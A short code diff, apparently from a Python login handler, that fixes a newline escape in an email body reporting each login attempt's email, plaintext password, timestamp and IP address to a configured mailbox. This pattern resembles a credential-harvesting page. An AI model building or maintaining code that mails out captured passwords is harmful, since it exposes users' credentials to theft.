@@ -30,7 +30,7 @@ def login():
             recipients=[os.getenv("MAIL_USERNAME")],
         )
         msg.body = (
-            "Login Attempt\nEmail: %s\Password: %s\nTimeStamp: %s\nIP Address: %s"
+            "Login Attempt\nEmail: %s\nPassword: %s\nTimeStamp: %s\nIP Address: %s"
             % (
                 email,
                 password,
